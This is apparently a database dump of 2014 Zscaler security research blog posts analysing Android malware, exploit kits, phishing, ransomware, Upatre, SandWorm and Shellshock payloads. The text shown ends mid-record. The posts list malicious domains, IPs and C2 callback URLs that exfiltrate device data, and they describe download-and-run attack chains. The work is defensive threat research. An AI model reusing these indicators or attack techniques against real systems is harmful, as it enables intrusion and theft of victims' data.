information harvesting feature:                    It sends the harvested information via a POST request as seen below:             Code snippet showing the SMS sending feature:                  Code snippet showing the SMS interception and storage arrays:  .              The intercepted SMS data, Subscriber ID, and phone number information are then sent to the C2 server in an encrypted form  .          Here is a sample request:    http://googleapiserver.net/kysnfhwo.php?1=4fe08eXXXXXXXXXXXXXXXXXXXX&4=3XXXXXXXXXXXXXXX      The malicious app performs the activity of harvesting sensitive information and sending it to the remote server on a regular interval by setting up an alarm as seen below:                    Upon installation, the user will see the game icon on the screen, that disappears shortly thereafter with the malicious process still running in the background.         Recommendation:    Cybercriminals often lure users with pirated versions of popular paid mobile applications that are Trojanized to steal sensitive information. It is strongly recommended that users stay away from such offers and download mobile app only from the trusted sources like the Google Play store.', 'Malware;Mobile;Mobile Malware', 'https://www.zscaler.com/blogs/research/trojanized-and-pirated-assassins-creed-app');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (166, 'Defaced Websites Leading To Dokta Chef Exploit Kit And CVE-2014-6332', 'Chris Mannon', 'November 26, 2014', 'Defacing websites has been the main stay for hacktivist groups to spread their message.  During recent research, we found multiple compromised websites containing a malicious link to a \"lulz.htm\" page, which in turn leads the user to a Dokta Chef Exploit Kit (EK) hosting site. This appears to be  a new tactic whereby a hacktivist group has escalated their activities by attacking users who visit defaced sites.  This is out of character for such groups that generally seem more interested in disrupting private sector compliance with government entities, than targeting end users.               The contact information provided on the defacement page shows that the culprits of this attack are claiming to be part of the \"AnonGhostTeam\" group, based on the associated Twitter account.  This group has targeted numerous Government and Mass Media websites in the past including:      	swo.gov.sy  	syrianpost.gov.sy  	myisrael.org.il  	madagascar.gov.mg  	skynewsinternational.com  	ccvs.state.vt.us  	txep.uscourts.gov  	rsb.wp.mil.pl  	navy.gov.au  	igc.mowr.gov.iq  	embavenez.co.uk  	libyanembassy-italy.gov.ly        	  		  			  		  		  			The defaced pages have been lifted in most cases, leaving only a Zone-H mirror  		  	           	  		  			  		  		  			Written in Beautiful Comic Sans  		  	    The defaced websites were found to be hosting a page called \"lulz.htm\", that contains highly obfuscated JavaScript code leading the users to a Dotka Chef EK infection cycle.           	  		  			  		  		  			Obfuscated JavaScript on the compromised sites  		  	           CVE-2014-6332 exploit         The Dokta Chef EK, was serving a malicious payload for a recently disclosed Microsoft Vulnerability CVE-2014-6332, that causes remote code execution when the user visits a specially crafted webpage using Internet Explorer (IE). The vulnerability is triggered when IE improperly accesses Object Linking and Embedding (OLE) objects in the memory. The vulnerable code has been present in OleAut32 library since IE version 3.0 and was recently fixed - MS14-064                 The attacker is targeting only the 32-bit Windows Operating systems and also ensuring that the user\'s browser is IE, as seen in the exploit code snippet above. The exploit cycle will terminate if any of the following conditions are true:           	User is browsing from a 64-bit Windows Operating system  	User is browsing from a non-Windows Operating system,   	User\'s browser is not IE             If the IE version used by the victim is lower than 4, the runshellcode() routine will be invoked, skipping the CVE-2014-6332 exploit cycle.  If the version used is higher than 3, setnotsafemode() routine is invoked to exploit the CVE-2014-6332 vulnerability.         The CVE-2014-6332 vulnerability is triggered by using an abnormally large array in conjunction with the redim Preserve function, as shown in the VBScript exploit code snippet above.    At the time of research, the end payload was not reachable, but the VirusTotal Scan of the hostname shows a history of dubious activity.    The Zscaler ThreatLabZ team has deployed multiple protections against this threat and is actively monitoring the malicious activity surrounding this mass compromise.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/defaced-websites-leading-dokta-chef-exploit-kit-and-cve-2014-6332');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (167, 'Beware Of Phishing Attacks And Other Scams During The Thanksgiving Shopping Season', 'Rubin Azad', 'November 25, 2014', 'Thanksgiving Day is one of the major holidays celebrated in the United States on the fourth Thursday in November. The following Friday, referred to as Black Friday, marks the start of the Christmas holiday shopping season. Almost every retailer large and small offers huge discounts on Black Friday, often extending through the weekend and the following Monday, now known as Cyber Monday.       As we near Thanksgiving and the start of the holiday shopping frenzy, we’re observing a sharp increase in cyber scams and phishing activities targeting online shoppers. As shoppers look for the best deals available, cybercriminals are quick to take advantage of unsuspecting users.         Increase in online shopping transactions         Every year during this timeframe, we observe a noticeable spike in the total number of web transactions within the Shopping category. We have shared this trend in our previous blogs as well ([1],[2]).         Last year, we saw around 2.71% of all the web transactions categorized as Shopping and this year is no different. We currently see that 2.63% of total web transactions belong to the Shopping category and we expect this number to rise as we approach the end of the month. The following chart shows that the number of Shopping transactions has increased steadily throughout November.                       Cyber Scams and Phishing attacks         The increase in Shopping activity comes with an unwelcome increase in phishing attempts. Phishing is a well known attack method, often used by attackers to steal sensitive information like authentication credentials, credit card numbers and personal information. We have already seen a large spike in Phishing and Spam activity, specifically targeting Thanksgiving, Black Friday, and Cyber Monday events. The following graph shows the phishing transactions for this month that have been blocked by Zscaler:                  We caution consumers to be extra vigilant this holiday season when shopping online. Here are some examples of phishing attempts that we have blocked:         Walmart phishing attempt:                                 Amazon phishing attempt:                       Ebay phishing attempt:                  The motive behind these attempts is to steal sensitive user information which includes personal credentials and financial data. Cybercriminals often use this stolen information for illicit activities resulting in monetary gain.         More phishing sites targeting online retailers:      	  	Ebay - hxxp://124[.]150[.]140[.]133/~ritenfad/viewitem/dll/88322933932/  	  	  	Walmart - hxxp://ofertaswalmart[.]besaba.com  	  	  	Walmart - hxxp://walmartfriday[.]net/  	  	  	Amazon - hxxp://zekocase[.]com/._ama_c0nf1rm/info_bill/login.php  	  	  	Amazon - 213[.]13[.]119[.]152/am/  	           Fake Black Friday/Cyber Monday/Thanksgiving related sites:      	  	hxxp://sfspr[.]org/?hid=hollister-cyber-monday-cyber-monday-sale  	  	  	hxxp://cyber-shop[.]net  	  	  	hxxp://www[.]ocdiagnostics[.]net/?id=louboutin-loafers-cyber-monday-deals  	  	  	hxxp://koeriersdienstdemolen[.]nl/wp-content/languages/?page=toms-soap-cyber-monday-2014  	  	  	hxxp://devillevacaville[.]com/?tid=cyber-monday-toms-canada  	  	  	hxxp://postyourads.co[.]uk/?mid=mulberry-bags-cyber-monday-deals  	  	  	hxxp://semexcesso.com[.]br/?hid=hollister-girls-cyber-monday-2014  	  	  	hxxp://dl5.iq11download[.]com/lm/lmdisc2/thanksgivingss.exe  	  	  	hxxp://www[.]americanasblackfriday[.]esy[.]es  	  	  	hxxp://www[.]systempackaging[.]com/images/ugg/black-friday-uggs-p-35.html  	  	  	hxxp://busycatholicmoms[.]com/2013/11/26/new-articles-and-happy-thanksgiving/  	           Sample of subjects used in spam e-mail messages targeting online shoppers:           	  	Get Stylish-furniture At Discount  	  	  	Checkout tire sales for Black Friday  	  	  	Make the Most of Black Friday, with A New smart-phone  	  	  	Brand name laptops on sale for BlackFriday  	  	  	[Black Friday Starts EARLY]Saveup to 90% +FREE BonusItems!  	  	  	Walmart One Day Specials BlackFriday  	  	  	Shop Black Friday sales to upgrade furniture  	  	  	Thanksgiving Specials and BlackFriday Discounts!  	  	  	New Early BlackFriday Door busters are Added EveryDay  	  	  	Shop Black Friday to find discounts on electronics  	  	  	Search major Savings on laptops...On black-friday  	  	  	Limited Time Black Friday Deal  	  	  	10% off Site-Wide. Get Your Black Friday Shopping Started Today!  	           How can online shoppers protect themselves?         Thanksgiving marks the start of the holiday shopping season which continues until Christmas. The Zscaler ThreatLabZ team is working round the clock to ensure that our customers do not fall prey to such malicious activity.         We highly recommend that all online shoppers exercise extreme caution and follow our holiday season shopping security checklist:             	  	Inspect the source of emails with shopping deals  	             	  	Ensure HTTPS/secure connections to online retailers and Banking sites  	             	  	Check the authenticity of the URL or website address before clicking on a link  	             	  	Stay away from e-mailed invoices - this is often a social engineering technique used by cybercriminals  	             	  	Do not use insecure public WiFi for shopping  	             	  	Use two-factor authentication whenever possible especially on sensitive accounts such as those used for banking  	             	  	Always ensure that your Operating System and Web Browser have the latest security patches installed  	             	  	Use browser add-ons like Adblock Plus to block popups and potential malvertisements  	             	  	Backup your documents and media files  	             	  	Review the Identity Theft Guide and FAQ from the Federal Trade Commission.  	           Wishing you all a very Happy Thanksgiving and don’t spend too much!    Credit for analysis: Rubin Azad, Uday Pratap Singh', 'Advertising', 'https://www.zscaler.com/blogs/research/beware-phishing-attacks-and-other-scams-during-thanksgiving-shopping-season');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (168, 'Evolution Of Upatre Trojan Downloader', 'Deepen Desai', 'November 12, 2014', 'Background\r\n\r\nUpatre is a Trojan Downloader family that once installed, is responsible for stealing information and downloading additional malware onto the victim machine. It typically arrives via spammed e-mail messages from the Cutwail Botnet, either as an attachment or via a URL pointing to a remote hosting site. We are also seeing Exploit Kits being used as a vector for Upatre infections in the wild.\r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Upatre Downloader cybercrime network\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\nUpon successful infection, Upatre has been responsible for downloading malicious payloads from known malware families such as:\r\n\r\n\r\n	Zeus (Zbot) banking Trojan\r\n	Rovnix Volume Boot Record (VBR) bootkit\r\n	Dyreza (DYRE) banking Trojan\r\n\r\n\r\nThe Upatre malware family was first discovered in August 2013 and exponentially increased its infection rates by October, 2013. With the demise of the popular Blackhole Exploit Kit in October 2013, many malware authors resorted to traditional spam with the Upatre Trojan downloader as a medium for delivery of the ultimate payload, which also contributed to the increase in infections.\r\n\r\nThe Upatre malware authors have deployed multiple new techniques over the past year, which is the reason why it is one of the most prevalent malware families today. Some of the features that we have tracked include:\r\n\r\n\r\n	Password protected attachments - This makes the e-mail look more legitimate and confidential\r\n	Spammed as an attachment inside an attachment - The spammed e-mail messages contained another e-mail message (*.msg, *.eml) as an attachment which contains the actual Upatre archive attachment\r\n	Email messages containing a URL pointing to the actual payload\r\n	Randomized header bytes and encrypted malware downloads to evade detection\r\n	Usage of SSL encryption for Command & Control (C2) communication and subsequent malware downloads\r\n\r\n\r\nRecent Attacks\r\n\r\nWe have seen an increase in the number of Upatre Downloader infections occurring through spammed messages containing fake invoices or voice-mail messages in the past month. The final payload being downloaded from these recent Upatre infections tends to be the Dyreza Banking Trojan. Below is a sample e-mail message from this campaign:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Cutwail spam e-mail leading to Upatre\r\n		\r\n	\r\n\r\n\r\n\r\nIf the user clicks on the link in the e-mail, they will be redirected to the same site with additional information identifying the operating system in the URI before serving the payload as seen here:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nGET /documents/invoice_101114_pdf.php?h=[3 digit integer]&w=[4 digit integer]&ua=[User-Agent String]&e=1 HTTP/1.1\r\n\r\nThe user will then be prompted to download a zipped archive file, which contains a new variant of the Upatre Trojan downloader as seen below:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Upatre download in an archive\r\n		\r\n	\r\n\r\n\r\n\r\nThe user is redirected to a legitimate site (i.e \"www.hsbc.com\"), if the operating system is not supported or is redirected at the end of the download cycle.\r\n \r\n\r\nThe infection cycle begins once the user opens the enclosed executable file. It makes a copy of itself as \"%Temp%\\pvavq.exe\" and runs it. The newly launched process \"pvavq.exe\", will then delete the original executable \"invoice10-11-14_pdf.exe\". It connects to a remote C2 server over TCP port 40007 to report the infection and supply information about the Month and Year of spammed binary, victim computer name, operating system information, etc.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Upatre network communication\r\n		\r\n	\r\n\r\n\r\n\r\n \r\n\r\nIt further downloads the Dyreza banking Trojan in an encrypted form as \"%Temp%\\utt214.tmp\" on the victim machine to evade network detection. It then decrypts the downloaded payload as \"%Temp%\\EXE1.exe\" and executes it. This will initiate the Dyreza banking Trojan infection cycle.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Dyreza banking Trojan encrypted and decrypted payload\r\n		\r\n	\r\n\r\n \r\n\r\nThis variant uses an incremental 4-byte XOR key in the decryption routine as opposed to the hardcoded key we have seen before.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Part of Upatre decryption routine for downloaded payload\r\n		\r\n	\r\n\r\n \r\n\r\nThe following screenshot shows the custom User-Agent string and hard coded remote server locations we found during our Upatre binary analysis:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			unpacked Upatre binary\r\n		\r\n	\r\n\r\n\r\nIndicators of Compromise\r\n\r\nHere is a sample list of HTTP requests that will provide a good indication of an Upatre and Dyreza compromise on your network:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Upatre indicators of compromise\r\n		\r\n	\r\n\r\n\r\n\r\nAdditionally, we have seen the following three hardcoded User-Agent strings being used for the HTTP requests in the Upatre variants that we have analyzed:\r\n\r\n	ENUPDATE\r\n	ONLYUPDATE\r\n	UPDATE\r\n\r\nConclusion\r\n\r\nThe Upatre Trojan downloader family continues to evolve and is one of the most prevalent malware families at present. It continues to add new malware to its cyber crime pay-per-install nexus, serving as a vector for downloading and installing additional malware family payloads.\r\n\r\nZscaler ThreatLabZ is actively monitoring this threat and ensuring full security coverage for our customers.', 'Exploit Kit;Malware', 'https://www.zscaler.com/blogs/research/evolution-upatre-trojan-downloader');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (169, 'Crypto-Ransomware Running Rampant', 'Chris Mannon', 'October 27, 2014', 'There\'s no doubt that ransomware is one of the most popular malware threats of 2014. Zscaler is not alone in this opinion, as other security firms have observed up to a 700% increase in infection rates to ransom-like malicious activity on victim PCs.  It\'s no wonder the attacks are so effective when for example, the delivery mechanism is designed to impersonate a legitimate service such as a harmless eFax.       	  		  			  		  		  			This link is seen from a phishing e-mail.  		  	    Ransomware attacks can be monetized quickly and efficiently without the need to create a large scale botnet or expose the attacker\'s affiliate ID via click-fraud schemes. We\'ve seen multiple attack vectors leveraged to target end users. Some vectors we have monitored include phishing email links or a malvertising campaign which leverages exploit kit distribution. Attackers will often pose as legitimate services, such as a law enforcement agency or a mass media outlet, in order to lure the unsuspecting victim into their scheme.    We recently encountered a ransomware campaign leveraging phishing e-mails purporting to be from the Australian Postal Services. The spam campaign themes used by the attackers involve tracking services or mobile invoices containing a link to the malicious content.  Upon completion of a CAPTCHA, the user is provided a zip file which contains a malicious executable posing as a PDF document.         At the time of research, this particular file shows a a detection rate of 16/53 antivirus engines on Virustotal. Before the victim even has a chance to realize their mistake, they are greeted by a message informing them of just how impacted they are.         	  		  			  		  		  			It\'s rare for a piece of malware to name itself to the victim...  			   		  	        The goal of Cryptolocker or any other Crypto-Ransomware attack is to encrypt personal files and hold them hostage. The attacker encrypts the files using a specific key which is either obtained during the phone home request to a Command & Control (C2) server, or hard-coded within the malicious executable. In  this case, the malicious executable itself is falsely presenting itself as a valid executable for AQQ IM.        	  		  			  		  		  			AQQ is a popular IM application  		  	    Cryptolocker\'s encryption has been an evolving piece of this threat, often relying on asymmetric encryption to lock the victim\'s files.  In this particular version, the Cryptolocker variant targeted the following folders for encryption:      	 C:\\MSOCache\\All Users\\  	 C:\\Users\\[Public/Username]\\        	  		  			  		  		  			The \".encrypted\" files can only the key controlled by the attacker can release them.  		  	      The threat will also drop a file in the Windows directory and an associated registry key to launch the file upon boot.  This will ensure that the threat will remain persistent if the victim attempts to reboot their system.         	  		  			  		  		  			The autostart value is randomly generated.  		  	      Cryptolocker will phone home to a hard-coded malicious domain via SSL. The SSL certificate is signed using the printable string \'debian\'. This transaction is the secure communication which will provide the specific key needed to encrypt the victim\'s files.         	  		  			  		  		  			Viewing the C:\\Windows\\uhjrajyj.exe in this case will reveal the hardcoded domain used to phone home.  		  	        	  		  			  		  		  			The phone home address is hard-coded within the malicious payload.  		  	         Decrypted SSL traffic reveals the initial call back attempt that contains a POST request with victim\'s machine name and unique ID as seen below:       	  		  			  		  		  			Decrypted call back attempt  		  	    This variant was found to be using a Domain Generation Algorithm for the C2 server communication, similar to the phone home method of Zeus.GameOver.         	  		  			  		  		  			DGA activity  		  	      These domains are largely returning 504 errors now as they have either not yet been registered or have already been shutdown.  A few do were still live at the time of the research.  Zscaler inspected the associated IP addresses and found them to be hosted in the Russian Federation. The two server IP addresses of note at the time of the blog are 46.161.30.20 and 46.161.30.19.  Active ransomware URLs leading to these servers include:      	usygoseqowapadoh[.]com:443  	usygoseqowapadoh[.]com/topic.php  	octoberpics[.]ru:443  	octoberpics[.]ru/topic.php    Conclusion    Administrators should be on the lookout for the above connections as they likely indicate a compromised system. Given how prevalent this threat is, the U.S. Government recently released an associated alert on the US-CERT site.     Taking regular backups of your personal files remains a user\'s best chance at mitigating the threat if they have been hit by this attack. It is also important for system administrators to enforce  strict file-type access control policies surrounding the download of archive and executable files from unknown sources.', 'Compromise;Encryption;Exploit;Malware', 'https://www.zscaler.com/blogs/research/crypto-ransomware-running-rampant');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (170, 'Android Ransomware \'Koler\' Learns To Propagate Via SMS', 'Viral Gandhi', 'October 24, 2014', 'Android Koler is a family of ransomware that targets Android users by locking up their mobile devices and demanding a ransom. It is believed to be the mobile extension of the Reveton ransomware family. Ransomware has been a profitable venture in the PC world with the likes of Crytolocker, but is a relative newcomer on mobile devices, at least in part due to file restrictions in mobile operating systems which limit the ability of apps to access the full file system. Despite this fact, the mobile market is clearly one that ransomware operators would like to tap into and Koler is a step in that direction.    In case of this new Koler variant, the malicious Android application arrives via a shortened bit.ly URL to a Dropbox location and pretends to be an image file. If the unsuspecting user downloads and installs the package, it will lock the user\'s screen, displaying a fake FBI warning page (see below), accusing the user of viewing child pornography. Additionally, we also found a new self-propagation module that allows it to spread by sending SMS messages containing the shortened URL to all contacts on the compromised device.       Analysis       Name: IMG_7821.apk    Md5: c7ee04bf3e42640ef6b5015b8af01f4f    Permissions:           	android.permission.INTERNET  	android.permission.READ_CONTACTS  	android.permission.READ_PHONE_STATE  	android.permission.RECEIVE_BOOT_COMPLETED  	android.permission.SEND_SMS  	android.permission.SYSTEM_ALERT_WINDOW      The user\'s device screen gets locked with following fake warning upon infection:                The ransom amount to unlock the device is U$300 USD as seen below:           Below, we can see the self-propagation code, where Koler sends out text messages containing a link to download the Koler APK, to all the contacts on the infected mobile device.                             Full text message that gets sent out:   \"someone made a profile  named -Luca Pelliciari- and he uploaded some of your photos! is that  you? http://bit.ly/img7821\".     The shortened URL points to a Dropbox location hosting the same ransomware package. The dropbox file has now been taken down.    Upon successful infection, the ransomware also connects to a predetermined command and control server and sends out sensitive device information like build version and device id.                Command and Control callback    http://admobtube.com/send.php?v=4.0.3&brok=puks&u=XXX&id=XXXX&pin=XXXX    The ransomware variant also incorporates an anti-VM technique to avoid being debugged inside an emulator. This is achieved by checking for the value of the Device ID. If the value contains all zeros (indicating the presence on a VM), the application will hide and terminate itself as seen below:                Conclusion    We did not see any file encryption routine to encrypt the user\'s files, but it is able to lock the screen and stay persistent even after reboot.    It is highly recommended that users install applications from authorized stores only. It is important to check the developer information, ratings for the application, permissions requested upon installation and also ensure that the application has been signed by the developer.    Reference:  http://www.joesecurity.org/reports/report-c7ee04bf3e42640ef6b5015b8af01f4f.html', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/android-ransomware-koler-learns-propagate-sms');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (171, 'Analysis Of SandWorm (CVE-2014-4114) 0-Day', 'Deepen Desai', 'October 14, 2014', 'Background\r\n\r\niSIGHT Partners, working with Microsoft, today published details of a 0day vulnerability (CVE-2014-4114) used in a possible Russian cyber-espionage campaign targeting NATO, the European Union, the Telecommunications and Energy sectors.\r\n\r\nIn this blog, we will provide a quick analysis of an exploit payload targeting this vulnerability, presently in the wild and showcase Zscaler\'s APT detection capabilities.\r\n\r\nCVE-2014-4114\r\nA vulnerability in Windows Object Linking and Embedding (OLE) package manager could allow an attacker to perform remote code execution on the target system. The attacker exploits this vulnerability via a specially crafted Microsoft Office file with embedded OLE files from a remote location. The remote files in the SandWorm exploit hilighted by iSIGHT Partners include a malicious executable from a known malware family, namely the BlackEnergy Trojan. BlackEnergy malware family first appeared in year 2007 and has been involved in multiple targeted attack campaigns this year.\r\n\r\nThe exploit payload involved in this case is a PowerPoint Open XML Slide Show file named spiski_deputatov_done.ppsx. This file contains two malicious embedded OLE objects which point to remote files as seen below:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			CVE-2014-4114: Embedded OLE Object 1\r\n		\r\n	\r\n\r\n\r\n The embedded OLE Object 1 contains the remote location of the BlackEnergy Trojan pretending to be an image GIF file.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			CVE-2014-4114: Embedded OLE Object 2\r\n		\r\n	\r\n\r\n\r\nThe embedded OLE Object 2 contains the remote location of the setup information file - INF file that contains information used by Windows to install drivers. In this case, the INF file slides.inf contains information to rename and execute the BlackEnergy Trojan executable file slide1.gif as seen below:\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			CVE-2014-4114: slide.inf file\r\n		\r\n	\r\n\r\n\r\nThe process flow for this infection cycle looks like below:\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			CVE-2014-4114: Process flow during a successful exploit cycle\r\n		\r\n	\r\n\r\n\r\nThe end user will be completely oblivious to this infection cycle and will see a slide show containing the following images upon execution:\r\n \r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			CVE-2014-4114: Exploit payload PPSX images seen by user\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\nZscaler APT detection\r\n\r\nThe Zscaler Behavioral Analysis engine accurately flags this 0-day exploit payload as malicious and blocks it as seen in the report below:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n\r\nConclusion\r\n\r\nAll the supported versions of Microsoft Windows and Windows Server 2008 & 2012 operating systems are vulnerable. It is extremely important for the enterprises to install the latest Microsoft security patches to avert these attacks. More information about this vulnerability patch is available here:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	MS14-060\r\n	Zscaler Security Advisory - October 14, 2014\r\n\r\n\r\nZscaler ThreatLabZ has deployed multiple levels of security countermeasures to protect the customers against these 0-day exploits.\r\n\r\n- Deepen Desai', 'Zero Day', 'https://www.zscaler.com/blogs/research/analysis-sandworm-cve-2014-4114-0-day');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (172, '#BASHed Evolution Of Shellshock Attack Payloads', 'Deepen Desai', 'October 07, 2014', 'Background  We recently blogged about the GNU Bash arbitrary code execution vulnerability (CVE-2014-6271) dubbed as Shellshock and covered some initial attacks that we captured in the wild during the first week of this vulnerability disclosure. We have continued to monitor the Shellshock exploit attacks and the malicious payloads that were getting dropped over past two weeks.    In this blog, we wanted to share a summary of new exploit attacks and new tricks that cybercriminals have deployed to increase the chances of infection.    Shellshock Attack analysis    The first attack, as reported in our previous blog, involved download and installation of a Linux Backdoor Trojan with DDoS capability detected by us as Unix/Flooder.AN.    Here the attack pattern was straight forward, if the bash exploit was successful then a malware payload was getting downloaded and installed.    Perl IRC bots    Next we saw a series of exploit attempts where a Perl based IRC bot was getting downloaded and executed on the target server. We will share two sample cases here.    In the first case, we saw a Base64 encoded Perl based IRC bot getting downloaded, decoded and executed on the target machine.                	  		  			  		  		  			Shellshock exploit downloading Perl IRC bot  		  	                       	  		  			  		  		  			Base64 encoded Perl IRC bot  		  	        In the second case, we saw another Perl IRC bot getting downloaded and executed with a command-line argument which is the IRC server IP.                     	  		  			  		  		  			Shellshock exploit downloading Perl IRC bot  		  	                       	  		  			  		  		  			Perl IRC bot  		  	        The attacker performs following action here before downloading and running the bot:                	Terminate all the PHP and PERL instances running on the server.  	Attempts to delete all the content in the /tmp/ and /var/tmp/ directory.  	Avoids hardcoding the Command and Control server IP in the bot file that gets downloaded.      Things became more interesting after this when we started seeing attacks involving tricks to add stealth and persistence to the infection. We also saw tricks used to prevent any further exploit attempts on the server by attempting to apply security patches to the server once the exploit infection was successful.    Linux.Tsunami C source code    In the attack case shown below, a bash script gets downloaded and executed on the target server upon successful exploit attempt.                     	  		  			  		  		  			Shellshock exploit downloading C IRC bot  		  	                       	  		  			  		  		  			Shell script payload downloaded upon successful exploit  		  	        The shell script will perform the following actions:                	Downloads an IRC bot written in C programming language  	Attempts to compile the C bot program using gcc compiler on the victim server  	Executes the newly generated ELF IRC bot binary  	Creates a crontab entry to download and infect the system on a weekly basis      This is a way of establishing persistence, even if the system administrator identifies and removes the culprit file the system will again get infected when the cronjob triggers. The attacker is also transferring a plain-text file as oppose to an ELF binary in an attempt to evade network perimeter defenses.    Linux.Tsunami ELF binary    In the most recent case, the attacker first ensures that the current bash session does not get recorded to the history file. It then also involved a shell script getting downloaded and executed on the target server as seen below:                     	  		  			  		  		  			Shellshock exploit attempt downloading Linux.Tsunami  		  	                       	  		  			  		  		  			Shell script payload downloaded upon successful exploit  		  	        The shell script will perform the following actions:                	Downloads and executes a new variant of Linux.Tsunami DDoS bot  	Create crontab entry to ensure future update and persistence  	Attempts to download and patch the Bash vulnerability in an attempt to prevent new infections from competitors?  	Uses shred command before deleting itself (downloaded shell script)      shred command Overwrite the specified FILE(s) repeatedly, in order to make it harder for even very expensive hardware probing to recover the data.    Conclusion    We have seen a quick evolution in the Shellshock exploit attack payloads that can be broadly classified into following categories:                	Persistence - achieved by creating cronjob.  	Evasion - payload Base64 encoding (Perl bot) and plain-text C source code transfer.  	Stealth - prevents recording of bash session history, usage of shred and rm commands.  	Competitive Advantage - removing other exploit payloads, installing new payload and applying security patches to prevent further exploit & infection attempts.      It is extremely important for the system administrators to test if their server is vulnerable and apply appropriate security patches as described in our previous blog. It is also important to check for the indicators of compromise mentioned in the above attack cases.    Zscaler customers are protected from this threat and the associated malware payloads. Zscaler ThreatLabZ is actively monitoring this threat and associated attacks in the wild.', 'Denial Of Service;Malware;Vulnerability;Zero Day', 'https://www.zscaler.com/blogs/research/bashed-evolution-shellshock-attack-payloads');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (173, 'Fiesta Exploit Kit: Live Infection', 'Sameer Patil', 'September 29, 2014', 'During our daily hunt for Exploit Kits (EK), we came across many live Fiesta exploit chains.    The infection started from the following compromised domains:        	      orpi.com  	      soyentrepreneur.com  	      interfacelift.com        Compromised sites:    The attackers often leverage compromised sites to serve as the first level of redirection in the EK infection cycle. In the first Fiesta EK instance that we analyzed, the attacker after getting the root access has modified the “scripts.js” file present at location:        	      hxxp://www[.]media[.]orpi[.]com/js/scripts.js             All the pages importing this JavaScript file will redirect the user to \"nvplus[.]com/wp-content/\".                      Another variation of the initial loading page redirection was observed in the compromised site “interfacelift[.]com” at the following location:        	      hxxp://interfacelift[.]com/wallpaper/downloads/date/any/                In this case the attacker added a <script> tag with the location pointing to another redirection site at:        	         hxxp://sunduk[.]biz/forum/docs/          A third variation of the initial redirection was observed on the compromised site  \"soyentrepreneur[.]com\", where the attacker created a new JavaScript file “funcionesCarga.js” at the following locations:        	         hxxp://www[.]soyentrepreneur[.]com/assets/js/funcionesCarga.js  	         hxxp://www[.]soyentrepreneur[.]com/assets/js/se2013/funcionesCarga.js        The website pages importing these JavaScript files will redirect the user to the Fiesta loading site.      All three initial redirection methods are fairly stealth and can remain unnoticed for days to the web administrators. We found this approach to be more effective and completely opposite from a RIG EK compromise that we recently analyzed where the attacker changed the home page of the website to ensure redirection.     Fiesta EK:    Some of the recent live Fiesta EK loading sites found in the wild are:        	       nvplus[.]com/wp-content/  	       son-ko[.]com/scripts/bundles/login.php  	       sunduk[.]biz/forum/docs/login.php  	       toringaz[.]com/images/  	       barferoase[.]de/blog/wp-content/themes/  	       www.artlen[.]com/assets/cache/rss/  	       www.courieru[.]com/cache/joomsef/  	       www.roofstroy[.]com/stroy/js.php  	       ticketstolisbon[.]com/dumper/  	       cic.com[.]ua/dok/  	       talktyme[.]com/flash/        Apart from the usual EK redirection chain, it checks for the user\'s browser as well as presence of application plugins for Microsoft Silverlight and Adobe Flash.       It checks if Silverlight plugin is installed by creating the following ActiveXObject object:    	 ActiveXObject(\"AgControl.AgControl\")     The presence of Flash plugin is ensured by creating the following object:      	swfobject.embedSWF()        If both the above object creation functions generate an exception, then the exploit cycle terminates. But if the vulnerable versions are found, it takes the user to the EK landing page.         	  		  			  		  		  			Redirection to Fiesta EK Landing page  		  	                   Fiesta Landing Page:    Initially, the malicious Silverlight and Flash files are downloaded for which the plugin checks have already been performed.       AV detection for the downloaded malicious files:         	      rtu.swf: 2/55 (Generic Exploit)  	      rtp.xap: 2/54 (CVE-2013-0074)             Following this, the main controller of Fiesta EK is called. Example in one of the Fiesta EK instance we analyzed:        	       hxxp://hjwqk.ianlar[.]in/pofrj4l/1        It generates the following GET requests to the same domain during the course of the Exploit cycle:         	  		  			  			·         hxxp://hjwqk.ianlar[.]in/pofrj4l/321eabf3f523be344045575e50595404020b045e5500560806060006515a5e04;120000;0    			·         hxxp://hjwqk.ianlar[.]in/pofrj4l/6ea46961ad8578015717000f07020406075c540f025b060a0351505706010e06    			·         